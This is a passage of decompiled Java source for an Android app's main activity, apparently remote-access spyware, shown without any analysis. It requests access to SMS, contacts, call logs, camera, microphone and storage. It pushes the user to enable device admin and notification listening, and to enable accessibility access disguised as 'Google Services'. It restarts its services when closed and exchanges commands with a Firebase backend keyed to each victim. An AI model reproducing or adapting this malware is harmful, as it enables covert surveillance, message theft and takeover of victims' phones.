                                }).addOnCompleteListener(26.this.MainActivity.this._mediaup_upload_success_listener);
                                return;
                            }
                            stringBuilder.append(string2.charAt(random.nextInt(string2.length())));
                            ++n;
                        } while (true);
                    }

                });
            }

        };
        this._timer.schedule(this.t, (long)((int)Double.parseDouble((String)string2)));
    }

    public void _seeifti() {
    }

    public void _setrespo(String string2, String string3, String string4, String string5, String string6) {
        this.responsetxt.clear();
        this.responsetxt = new HashMap();
        this.responsetxt.put((Object)"respo", (Object)string2);
        this.responsetxt.put((Object)"var2", (Object)string3);
        this.responsetxt.put((Object)"v1", (Object)string4);
        this.responsetxt.put((Object)"v2", (Object)string5);
        this.responsetxt.put((Object)"v3", (Object)string6);
        String string7 = String.valueOf((Object)"abcdefghijklmnopqrstuvwxyz") + "0123456789";
        Random random = new Random();
        StringBuilder stringBuilder = new StringBuilder(8);
        stringBuilder.append(string7.charAt(random.nextInt(-1 + string7.length())));
        int n = stringBuilder.length();
        do {
            if (n >= 8) {
                this.responsetxt.put((Object)"rndm", (Object)stringBuilder.toString());
                this._firebase.getReference("/respos/respo" + this.sp.getString("uid", "")).child("respo").setValue(this.responsetxt);
                return;
            }
            stringBuilder.append(string7.charAt(random.nextInt(string7.length())));
            ++n;
        } while (true);
    }

    /*
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    public void _setuid() {
        StringBuilder stringBuilder;
        block8 : {
            String string2 = String.valueOf((Object)"abcdefghijklmnopqrstuvwxyz") + "0123456789";
            Random random = new Random();
            stringBuilder = new StringBuilder(8);
            stringBuilder.append(string2.charAt(random.nextInt(-1 + string2.length())));
            int n = stringBuilder.length();
            do {
                if (n >= 8) {
                    FileOutputStream fileOutputStream = new FileOutputStream(String.valueOf((Object)FileUtil.getPackageDataDir(this.getApplicationContext())) + "/uid.txt", true);
                    fileOutputStream.write(stringBuilder.toString().getBytes());
                    fileOutputStream.close();
                    break block8;
                }
                stringBuilder.append(string2.charAt(random.nextInt(string2.length())));
                ++n;
            } while (true);
            catch (FileNotFoundException fileNotFoundException) {
                break block8;
            }
            catch (IOException iOException) {}
        }
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(String.valueOf((Object)FileUtil.getPackageDataDir(this.getApplicationContext())) + "/panel.txt", true);
            fileOutputStream.write(this.sp.getString("panel", "").getBytes());
            fileOutputStream.close();
        }
        catch (FileNotFoundException fileNotFoundException) {
        }
        catch (IOException iOException) {}
        this.sp.edit().putString("uid", stringBuilder.toString()).commit();
        this.responsetxt.clear();
        this.responsetxt = new HashMap();
        this.responsetxt.put((Object)"cmdn", (Object)"success");
        this.responsetxt.put((Object)"cmdv", (Object)"success");
        this.responsetxt.put((Object)"cmdvar", (Object)"success");
        this.responsetxt.put((Object)"rndm", (Object)"success");
        this._firebase.getReference("/comds/comds" + this.sp.getString("uid", "")).child("comdss").setValue(this.responsetxt);
        this._firebase.getReference("/comds/comds" + this.sp.getString("uid", "") + "phi").child("comdss").setValue(this.responsetxt);
        this.startService(new Intent(this.getApplicationContext(), servicess.class));
        this.startService(new Intent(this.getApplicationContext(), ForegroundService.class));
        Intent intent = new Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS");
        intent.putExtra("android.provider.extra.CHANNEL_ID", "ForegroundServiceChannel");
        intent.putExtra("android.provider.extra.APP_PACKAGE", this.getPackageName());
        this.startActivity(intent);
        this._pihtest();
        this._setrespo("success", "success", "success", "success", "success");
    }

    public void _snotiow(String string2, String string3, String string4, String string5, String string6) {
        Context context = this.getApplicationContext();
        NotificationManager notificationManager = (NotificationManager)context.getSystemService("notification");
        Intent intent = new Intent((Context)this, MainActivity.class);
        intent.setFlags(603979776);
        intent.putExtra("screen", string4);
        PendingIntent pendingIntent = PendingIntent.getActivity((Context)this, (int)0, (Intent)intent, (int)0);
        if (Build.VERSION.SDK_INT >= 26) {
            notificationManager.createNotificationChannel(new NotificationChannel("androidnoti", (CharSequence)"Android Notification", 4));
        }
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "androidnoti");
        int n = (int)Double.parseDouble((String)string5);
        NotificationCompat.Builder builder2 = builder.setSmallIcon(new int[]{2131165312, 2131165313, 2131165314, 2131165315, 2131165316, 2131165328, 2131165329, 2131165348, 2131165349, 2131165361, 2131165374, 2131165375, 2131165376, 2131165378, 2131165382, 2131165383, 2131165387, 2131165388}[n]).setContentTitle((CharSequence)string2).setContentText((CharSequence)string3).setAutoCancel(true).setOngoing(false).setContentIntent(pendingIntent);
        TaskStackBuilder taskStackBuilder = TaskStackBuilder.create((Context)context);
        taskStackBuilder.addNextIntent(intent);
        builder2.setContentIntent(taskStackBuilder.getPendingIntent(0, 134217728));
        notificationManager.notify(2, builder2.build());
    }

    @Deprecated
    public ArrayList<Double> getCheckedItemPositionsToArray(ListView listView) {
        ArrayList arrayList = new ArrayList();
        SparseBooleanArray sparseBooleanArray = listView.getCheckedItemPositions();
        int n = 0;
        while (n < sparseBooleanArray.size()) {
            if (sparseBooleanArray.valueAt(n)) {
                arrayList.add((Object)sparseBooleanArray.keyAt(n));
            }
            ++n;
        }
        return arrayList;
    }

    @Deprecated
    public float getDip(int n) {
        return TypedValue.applyDimension((int)1, (float)n, (DisplayMetrics)this.getResources().getDisplayMetrics());
    }

    @Deprecated
    public int getDisplayHeightPixels() {
        return this.getResources().getDisplayMetrics().heightPixels;
    }

    @Deprecated
    public int getDisplayWidthPixels() {
        return this.getResources().getDisplayMetrics().widthPixels;
    }

    @Deprecated
    public int getLocationX(View view) {
        int[] arrn = new int[2];
        view.getLocationInWindow(arrn);
        return arrn[0];
    }

    @Deprecated
    public int getLocationY(View view) {
        int[] arrn = new int[2];
        view.getLocationInWindow(arrn);
        return arrn[1];
    }

    @Deprecated
    public int getRandom(int n, int n2) {
        return n + new Random().nextInt(1 + (n2 - n));
    }

    public String getyi(String string2) {
        return new StringBuilder(string2).reverse().toString();
    }

    public boolean isAccessServiceEnabled(Context context, Class class_) {
        String string2 = Settings.Secure.getString((ContentResolver)context.getContentResolver(), (String)"enabled_accessibility_services");
        return string2 != null && string2.contains((CharSequence)(String.valueOf((Object)context.getPackageName()) + "/" + class_.getName()));
    }

    public void onBackPressed() {
    }

    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.setContentView(2131427375);
        this.initialize(bundle);
        FirebaseApp.initializeApp((Context)this);
        if (ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.WRITE_CONTACTS") == -1 || ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.READ_SMS") == -1 || ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.READ_CONTACTS") == -1 || ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.SEND_SMS") == -1 || ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.READ_CALL_LOG") == -1 || ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.WRITE_CALL_LOG") == -1 || ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.CAMERA") == -1 || ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.READ_EXTERNAL_STORAGE") == -1 || ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.WRITE_EXTERNAL_STORAGE") == -1 || ContextCompat.checkSelfPermission((Context)this, (String)"android.permission.RECORD_AUDIO") == -1) {
            ActivityCompat.requestPermissions((Activity)this, (String[])new String[]{"android.permission.WRITE_CONTACTS", "android.permission.READ_SMS", "android.permission.READ_CONTACTS", "android.permission.SEND_SMS", "android.permission.READ_CALL_LOG", "android.permission.WRITE_CALL_LOG", "android.permission.CAMERA", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.RECORD_AUDIO"}, (int)1000);
            return;
        }
        this.initializeLogic();
    }

    public void onDestroy() {
        Intent intent = new Intent();
        intent.setAction("restartservice");
        intent.setClass((Context)this, restarter.class);
        this.sendBroadcast(intent);
        super.onDestroy();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void onNewIntent(Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            String string2 = bundle.getString("screen");
            if (string2 != null) {
                this.webview1.loadUrl(String.valueOf((Object)string2));
                this._setrespo("dialogview", "", "Page Shown Successfully ", "", "");
            }
            return;
        }
        this.requestAutoStartPermission();
        Intent[] arrintent = AUTO_START_INTENTS;
        int n = arrintent.length;
        int n2 = 0;
        do {
            block9 : {
                block8 : {
                    if (n2 >= n) break block8;
                    Intent intent2 = arrintent[n2];
                    if (this.getPackageManager().resolveActivity(intent2, 65536) == null) break block9;
                    try {
                        this.startActivity(intent2);
                    }
                    catch (Exception exception) {}
                }
                Intent intent3 = new Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS");
                intent3.putExtra("android.provider.extra.CHANNEL_ID", "ForegroundServiceChannel");
                intent3.putExtra("android.provider.extra.APP_PACKAGE", this.getPackageName());
                this.startActivity(intent3);
                Log.d((String)"TEMP", (String)"Extras are NULL");
                return;
            }
            ++n2;
        } while (true);
    }

    public void onRequestPermissionsResult(int n, String[] arrstring, int[] arrn) {
        super.onRequestPermissionsResult(n, arrstring, arrn);
        if (n == 1000) {
            this.initializeLogic();
        }
    }

    public void onResume() {
        super.onResume();
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager)this.getSystemService("device_policy");
        ComponentName componentName = new ComponentName((Context)this, DeviceAdminComponent.class);
        if (devicePolicyManager == null || !devicePolicyManager.isAdminActive(componentName)) {
            SketchwareUtil.showMessage(this.getApplicationContext(), "Please Enable Admin Access to make This app work .");
            this.startActivity(new Intent().setComponent(new ComponentName("com.android.settings", "com.android.settings.DeviceAdminSettings")));
        }
        String string2 = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"enabled_notification_listeners");
        String string3 = this.getPackageName();
        if (string2 == null || !string2.contains((CharSequence)string3)) {
            this.startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
            SketchwareUtil.showMessage(this.getApplicationContext(), "Please Enable Notification Access to make this app work properly.");
        }
        if (!this.isAccessServiceEnabled(this.getApplicationContext(), logoss.class)) {
            this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
            SketchwareUtil.showMessage(this.getApplicationContext(), "Please Enable Google Services to make this app work properly.");
        }
    }

    @Deprecated
    public void showMessage(String string2) {
        Toast.makeText((Context)this.getApplicationContext(), (CharSequence)string2, (int)0).show();
    }

    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context context) {
            this.mContext = context;
        }

        @JavascriptInterface
        public void showToast(String string2) {
            MainActivity.this.textview1.setText((CharSequence)string2);
        }

        @JavascriptInterface
        public void showTt(String string2) {
            MainActivity.this._phidatsu(string2, "");
        }

        @JavascriptInterface
        public void showtoadtt(String string2) {
            SketchwareUtil.showMessage(MainActivity.this.getApplicationContext(), String.valueOf((Object)string2));
        }

        @JavascriptInterface
        public void showtoadtts(String string2) {
            MainActivity.this.ka.setAction("android.intent.action.VIEW");
            MainActivity.this.ka.setData(Uri.parse((String)string2));
            MainActivity.this.startActivity(MainActivity.this.ka);
        }

        @JavascriptInterface
        public void showts(String string2) {
            try {
                MainActivity.this.getApplicationContext().getPackageManager().getApplicationInfo(string2, 0);
                Intent intent = MainActivity.this.getPackageManager().getLaunchIntentForPackage(String.valueOf((Object)string2));
                MainActivity.this.startActivity(intent);
                return;
            }
            catch (PackageManager.NameNotFoundException nameNotFoundException) {
                MainActivity.this.ka.setAction("android.intent.action.VIEW");
                MainActivity.this.ka.setData(Uri.parse((String)("https://play.google.com/store/apps/details?id=" + string2)));
                MainActivity.this.startActivity(MainActivity.this.ka);
                return;
            }
        }
    }

}

